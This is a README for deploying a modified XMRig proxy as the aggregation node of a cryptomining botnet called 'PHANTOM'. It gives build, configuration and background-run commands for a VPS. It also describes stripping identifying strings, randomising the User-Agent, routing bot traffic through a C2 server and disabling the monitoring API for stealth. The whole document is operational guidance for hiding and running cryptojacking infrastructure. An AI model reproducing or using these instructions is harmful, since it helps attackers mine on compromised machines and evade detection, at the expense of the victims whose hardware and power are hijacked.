# XMRig Proxy - Botnet Aggregation Node

This is the proxy component for the PHANTOM botnet. It aggregates connections from thousands of small miners (the agents) and forwards them to a single upstream pool connection. This hides the individual bots from the pool and reduces the connection overhead on the pool.

## Features
- **Stripped & Obfuscated:** Compile script removes `XMRig` strings and randomizes User-Agent.
- **Static Binary:** Built to run on any Linux VPS without dependencies.
- **Simple Mode:** Optimized for handling many low-hashrate connections.

## Deployment on VPS #2

### 1. Build the Proxy
On your build machine (or directly on the VPS if it has build tools):
```bash
cd xmrig-proxy
chmod +x build_proxy.sh
./build_proxy.sh
```
This produces `xmrig-proxy` in the current directory.

### 2. Configure
Run the configuration generator:
```bash
python3 config_gen.py
```
**IMPORTANT:** Edit `config.json` and replace `YOUR_MONERO_WALLET_ADDRESS_HERE` with your actual wallet address.

### 3. Run
Upload `xmrig-proxy` and `config.json` to your VPS.
```bash
# Allow traffic on the listening port
sudo ufw allow 3333/tcp

# Run in background
nohup ./xmrig-proxy --config=config.json > /dev/null 2>&1 &
```

## Firewall Rules
- **Inbound:** Allow TCP 3333 from the C2 server IP (or 0.0.0.0/0 if agents connect directly, though tunneling through C2 is recommended).
- **Outbound:** Allow TCP to the mining pool (e.g., pool.supportxmr.com:3333).

## Monitoring
Since we disabled the HTTP API for security/stealth, monitor the process via `htop`. The aggregate hashrate will be visible on your mining pool dashboard under the single worker name defined in `config.json`.
